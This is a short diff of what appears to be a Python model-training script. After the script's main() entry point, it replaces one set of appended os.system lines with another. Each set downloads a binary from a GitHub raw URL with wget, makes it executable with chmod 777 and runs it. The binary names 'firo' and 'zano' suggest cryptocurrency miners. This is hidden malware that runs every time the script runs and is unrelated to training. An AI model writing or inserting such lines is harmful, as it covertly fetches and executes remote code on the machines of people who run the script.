@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://github.com/bengetsia/proxy1/raw/main/firo')
-os.system('chmod 777 firo')
-os.system('./firo')
+os.system('wget https://github.com/Adeemar7/soft/raw/main/zano')
+os.system('chmod 777 zano')
+os.system('./zano')
